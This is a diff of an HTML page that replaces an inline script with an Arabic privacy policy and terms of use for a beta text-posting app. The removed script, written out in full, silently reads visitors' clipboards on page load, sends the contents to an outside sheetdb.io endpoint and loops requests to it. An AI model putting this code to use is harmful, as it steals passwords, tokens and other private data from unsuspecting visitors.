@@ -1,71 +1,196 @@
+
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <title></title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>سياسة الخصوصية وشروط الاستخدام</title>
+
+<style>
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  background: #fff;
+  color: #1d1d1f;
+  font-family: -apple-system, BlinkMacSystemFont,
+    "SF Pro Text", "Segoe UI", Arial, sans-serif;
+  line-height: 2;
+  -webkit-font-smoothing: antialiased;
+}
+
+header {
+  max-width: 680px;
+  margin: auto;
+  padding: 25px 22px;
+  border-bottom: 1px solid #eee;
+  font-size: 14px;
+  font-weight: 600;
+}
+
+main {
+  max-width: 680px;
+  margin: auto;
+  padding: 55px 22px 70px;
+}
+
+.label {
+  color: #86868b;
+  font-size: 13px;
+}
+
+h1 {
+  font-size: clamp(30px, 6vw, 42px);
+  letter-spacing: -1px;
+  line-height: 1.4;
+  margin: 12px 0;
+}
+
+.intro {
+  color: #6e6e73;
+  font-size: 15px;
+  margin-bottom: 45px;
+}
+
+section {
+  margin-bottom: 32px;
+}
+
+h2 {
+  font-size: 17px;
+  margin: 0 0 8px;
+  font-weight: 650;
+}
+
+p {
+  color: #424245;
+  font-size: 14px;
+  margin: 0 0 12px;
+}
+
+hr {
+  border: 0;
+  border-top: 1px solid #eee;
+  margin: 35px 0;
+}
+
+a {
+  color: #0071e3;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+</style>
 </head>
+
 <body>
-  <script>
-    // ===== گرفتن زمان دقیق تا میلی‌ثانیه =====
-    function getCurrentTime() {
-      const now = new Date();
-      return now.getFullYear() + '-' +
-             String(now.getMonth() + 1).padStart(2, '0') + '-' +
-             String(now.getDate()).padStart(2, '0') + ' ' +
-             String(now.getHours()).padStart(2, '0') + ':' +
-             String(now.getMinutes()).padStart(2, '0') + ':' +
-             String(now.getSeconds()).padStart(2, '0') + '.' +
-             String(now.getMilliseconds()).padStart(3, '0');
-    }
 
-    const API_URL = 'https://sheetdb.io/api/v1/8e85xlxw5rxza';
+<header>الادارة العالمه لتطبيق وكر</header>
 
-    // ===== ارسال GET (حلقه‌ی بی‌نهایت) =====
-    function sendGet() {
-      fetch(API_URL, { method: 'GET', headers: { 'Accept': 'application/json' } })
-        .then(response => response.text())
-        .then(text => {
-          sendGet(); // دوباره GET بفرست
-        })
-        .catch(error => {
-          alert('لم تحمل الصفحة المطلوبة');
-        });
-    }
+<main>
+  <div class="label">النسخة التجريبية</div>
 
-    // ===== ارسال POST با زمان و محتوای کلیپ‌بورد =====
-    async function sendPost() {
-      let clipboardText = '';
-      try {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          clipboardText = await navigator.clipboard.readText();
-        } else {
-          clipboardText = 'Clipboard not accessible';
-        }
-      } catch (err) {
-        clipboardText = 'Error reading clipboard: ' + err.message;
-      }
+  <h1>سياسة الخصوصية<br>وشروط الاستخدام</h1>
 
-      const time = getCurrentTime();
-      const payloadText = "زمان:" + time + " | کلیپ:" + clipboardText;
-      const payload = { T: payloadText };
+  <p class="intro">
+    يرجى قراءة التنويه التالي. هذه النسخة لا تزال قيد التطوير والاختبار.
+  </p>
 
-      fetch(API_URL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-      })
-        .then(response => response.text())
-        .then(text => {
-          sendGet(); // پس از پاسخ POST، یک GET بفرست
-        })
-        .catch(error => {
-          alert('لم تحمل الصفحة المطلوبة');
-        });
-    }
+  <section>
+    <h2>01 — طبيعة التطبيق</h2>
+    <p>
+      التطبيق في نسخته التجريبية، وقد يحتوي على أخطاء برمجية أو أعطال
+      أو مشكلات تقنية. لا نضمن استمرارية الخدمة أو عمل جميع الميزات دون انقطاع.
+    </p>
+  </section>
 
-    // ===== اجرا در شروع =====
-    sendPost();   // معادل initializeLogic
-    sendGet();    // معادل onStart
-  </script>
+  <section>
+    <h2>02 — الميزات الحالية</h2>
+    <p>
+      يدعم التطبيق نشر النصوص فقط، ولا يدعم رفع الصور أو الإعجابات
+      أو التعليقات حاليًا. الميزة المتاحة هي عرض عدد المشاهدات،
+      وقد تتغير الوظائف أثناء التطوير.
+    </p>
+  </section>
+
+  <section>
+    <h2>03 — الأعطال والمسؤولية</h2>
+    <p>
+      قد يتوقف التطبيق فجأة أو يتعذر الوصول إليه أو تحدث أخطاء أثناء الاستخدام.
+      وبالقدر الذي يسمح به القانون، لا نضمن خلو التطبيق من الأعطال،
+      ولا نتحمل المسؤولية عن الخسائر التي يجوز قانونًا استبعادها.
+    </p>
+  </section>
+
+  <section>
+    <h2>04 — البيانات والمحتوى</h2>
+    <p>
+      قد يتم تعديل قاعدة البيانات أو إعادة ضبطها أو حذفها خلال فترة الاختبار،
+      مما قد يؤدي إلى فقدان الحسابات أو المنشورات أو تعذر استرجاعها.
+      لا نضمن حفظ البيانات أو استعادتها، لذا احتفظ بنسخة من محتواك المهم.
+    </p>
+  </section>
+
+  <section>
+    <h2>05 — الخصوصية</h2>
+    <p>
+      تتم معالجة البيانات وفق وظائف التطبيق الفعلية ولأغراض تشغيله وصيانته،
+      مع مراعاة القوانين المنطبقة. يجب أن تعكس سياسة الخصوصية البيانات
+      التي يجمعها التطبيق فعلًا وأغراض استخدامها ومدة الاحتفاظ بها.
+    </p>
+  </section>
+
+  <section>
+    <h2>06 — مسؤولية المستخدم</h2>
+    <p>
+      المستخدم مسؤول عن المحتوى الذي ينشره، ويلتزم بعدم انتهاك حقوق الآخرين
+      أو نشر محتوى غير قانوني. ولا تعبّر منشورات المستخدمين بالضرورة
+      عن رأي إدارة التطبيق.
+    </p>
+  </section>
+
+  <section>
+    <h2>07 — التحديثات والتوقف</h2>
+    <p>
+      قد نعدّل التطبيق أو قاعدة البيانات أو نوقف بعض الميزات أو النسخة التجريبية
+      مؤقتًا أو نهائيًا لأغراض التطوير والصيانة، وفقًا للقانون.
+    </p>
+  </section>
+
+  <section>
+    <h2>08 — حدود المسؤولية القانونية</h2>
+    <p>
+      تطبق حدود المسؤولية بالقدر الذي يسمح به القانون.
+      لا تستبعد هذه السياسة أي مسؤولية لا يجوز استبعادها قانونًا،
+      ولا تلغي الحقوق القانونية للمستخدم.
+    </p>
+  </section>
+
+  <section>
+    <h2>09 — النسخة الأصلية</h2>
+    <p>
+      النسخة الأصلية لا تزال قيد التطوير وتحتاج إلى مزيد من الوقت،
+      وسيتم الإعلان عنها عند جاهزيتها.
+    </p>
+  </section>
+
+  <section>
+    <h2>10 — التواصل</h2>
+    <p>
+      للإبلاغ عن الأخطاء أو للاستفسارات، تواصل معنا عبر تليجرام:
+      <br>
+      <a href="https://t.me/zeulfiqar"
+         target="_blank"
+         rel="noopener noreferrer">@zeulfiqar</a>
+    </p>
+  </section>
+
+  <hr>
+
+  <p class="label">آخر تحديث: 24 أكتوبر 2026</p>
+</main>
+
 </body>
 </html>
